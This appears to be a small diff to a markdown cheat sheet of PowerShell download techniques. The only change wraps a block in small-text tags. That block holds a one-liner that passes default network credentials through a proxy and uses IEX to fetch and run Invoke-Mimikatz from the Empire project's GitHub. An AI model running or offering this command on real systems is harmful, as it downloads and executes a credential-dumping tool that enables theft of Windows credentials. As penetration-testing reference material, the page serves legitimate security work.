@@ -3,11 +3,11 @@
 ## powershell.exe
 
 ### powershell proxy auth
-
+<small>
 $Client = New-Object -TypeName System.Net.WebClient
 $Client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 IEX (iwr 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
-
+</small>
 
 ### powershell 4.0 & 5.0 Invoke-WebRequest (works in constrained language mode)
 
